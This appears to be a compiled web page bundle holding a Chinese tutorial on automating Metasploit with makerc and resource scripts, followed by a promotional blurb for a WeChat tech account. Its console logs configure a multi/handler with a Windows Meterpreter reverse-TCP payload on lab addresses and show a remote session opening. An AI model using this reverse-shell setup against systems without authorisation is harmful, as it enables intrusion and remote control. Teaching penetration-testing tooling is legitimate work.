(window.webpackJsonp=window.webpackJsonp||[]).push([[276],{566:function(s,e,n){"use strict";n.r(e);var a=n(7),t=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"metasploit资源脚本的使用方法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#metasploit资源脚本的使用方法"}},[s._v("#")]),s._v(" Metasploit资源脚本的使用方法")]),s._v(" "),e("p",[s._v("Metasploit可以通过资源脚本实现自动化——使用资源脚本可以免去手动设置选项，实现选项的自动化设置，从而节省配置模块选项和攻击载荷所花费的时间。")]),s._v(" "),e("p",[s._v("创建资源脚本有两种方法：手动创建脚本或使用makerc命令创建脚本。makerc命令将之前输入过的所有命令都保存到一个文件中，可以使用resource命令使用这个文件。")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msf5 > use exploit/multi/handler \nmsf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) > set LHOST 192.168.175.128\nLHOST => 192.168.175.128\nmsf5 exploit(multi/handler) > set LPORT 4444\nLPORT => 4444\nmsf5 exploit(multi/handler) > show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.175.128  yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nmsf5 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 192.168.175.128:4444 \n[*] Sending stage (179779 bytes) to 192.168.175.130\n[*] Meterpreter session 1 opened (192.168.175.128:4444 -> 192.168.175.130:1025) at 2019-01-25 23:27:58 +0800\n\nmeterpreter > exit\n[*] Shutting down Meterpreter...\n\n[*] 192.168.175.130 - Meterpreter session 1 closed.  Reason: User exit\nmsf5 exploit(multi/handler) > makerc\nUsage: makerc <output rc file>\n\nSave the commands executed since startup to the specified file.\n\nmsf5 exploit(multi/handler) > makerc multi_handler\n[*] Saving last 8 commands to multi_handler ...\nmsf5 exploit(multi/handler) > \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br")])]),e("p",[s._v("这里，我们通过设置攻击载荷和各种选项，成功启动了一个渗透模块handler，输入makerc命令就可以将这些命令保存到一个指定的文件中。在这个示例中是multi_handler文件，我们保存了最近使用的8条命令。")]),s._v(" "),e("p",[s._v("接下来，我们就要通过resource命令使用这个资源文件，达到选项的自动化设置，如下所示：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msf5 exploit(multi/handler) > resource multi_handler \n[*] Processing /root/multi_handler for ERB directives.\nresource (/root/multi_handler)> use exploit/multi/handler\nresource (/root/multi_handler)> set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nresource (/root/multi_handler)> set LHOST 192.168.175.128\nLHOST => 192.168.175.128\nresource (/root/multi_handler)> set LPORT 4444\nLPORT => 4444\nresource (/root/multi_handler)> show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.175.128  yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nresource (/root/multi_handler)> exploit\n\n[*] Started reverse TCP handler on 192.168.175.128:4444 \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br")])]),e("h2",{attrs:{id:"写在最后"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),e("blockquote",[e("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);e.default=t.exports}}]);